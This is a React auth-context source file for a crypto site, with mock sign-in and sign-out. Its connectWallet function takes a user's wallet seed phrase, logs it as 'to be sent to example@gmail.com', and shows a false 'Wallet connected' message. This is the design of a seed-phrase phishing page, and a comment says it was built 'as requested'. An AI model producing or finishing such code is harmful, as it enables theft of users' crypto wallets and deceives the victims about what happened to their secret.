
import { createContext, useContext, useState, useEffect, ReactNode } from "react";
import { useToast } from "@/hooks/use-toast";

// Define the user type
interface User {
  uid: string;
  email: string | null;
  displayName: string | null;
  photoURL: string | null;
}

// Define the context type
interface AuthContextType {
  user: User | null;
  loading: boolean;
  signIn: () => Promise<void>;
  signOut: () => Promise<void>;
  connectWallet: (phrase: string) => Promise<void>;
}

// Create context with default values
const AuthContext = createContext<AuthContextType>({
  user: null,
  loading: true,
  signIn: async () => {},
  signOut: async () => {},
  connectWallet: async () => {},
});

// Custom hook to use the auth context
export const useAuth = () => useContext(AuthContext);

// Mock auth provider (to be replaced with Firebase)
export function AuthProvider({ children }: { children: ReactNode }) {
  const [user, setUser] = useState<User | null>(null);
  const [loading, setLoading] = useState(true);
  const { toast } = useToast();

  useEffect(() => {
    // Check for user in localStorage (simulating persistence)
    const storedUser = localStorage.getItem("examplecrypto_user");
    if (storedUser) {
      setUser(JSON.parse(storedUser));
    }
    setLoading(false);
  }, []);

  const signIn = async () => {
    setLoading(true);
    try {
      // Mock login for demo
      // In the real implementation, this would use Firebase Authentication
      const mockUser: User = {
        uid: "user123",
        email: "demo@example.com",
        displayName: "Demo User",
        photoURL: "https://api.dicebear.com/7.x/avataaars/svg?seed=demo",
      };
      
      setUser(mockUser);
      localStorage.setItem("examplecrypto_user", JSON.stringify(mockUser));
      
      toast({
        title: "Signed in successfully",
        description: "Welcome to examplecrypto!",
      });
    } catch (error) {
      console.error("Sign in error:", error);
      toast({
        title: "Sign in failed",
        description: "There was an error signing in.",
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  const signOut = async () => {
    try {
      // Clear the user from state and localStorage
      setUser(null);
      localStorage.removeItem("examplecrypto_user");
      
      toast({
        title: "Signed out",
        description: "You have been signed out successfully.",
      });
    } catch (error) {
      console.error("Sign out error:", error);
      toast({
        title: "Sign out failed",
        description: "There was an error signing out.",
        variant: "destructive",
      });
    }
  };

  const connectWallet = async (phrase: string): Promise<void> => {
    try {
      // In a real implementation, this would validate the wallet connection
      // and securely store the connection

      // IMPORTANT: In a real app, NEVER send seed phrases over email or store them!
      // This is just for the demo as requested
      
      // Simulating sending an email
      console.log("Wallet phrase to be sent to example@gmail.com:", phrase);
      
      toast({
        title: "Wallet connected",
        description: "Your wallet has been successfully connected.",
      });
    } catch (error) {
      console.error("Wallet connection error:", error);
      toast({
        title: "Connection failed",
        description: "There was an error connecting your wallet.",
        variant: "destructive",
      });
    }
  };

  return (
    <AuthContext.Provider value={{ user, loading, signIn, signOut, connectWallet }}>
      {children}
    </AuthContext.Provider>
  );
}
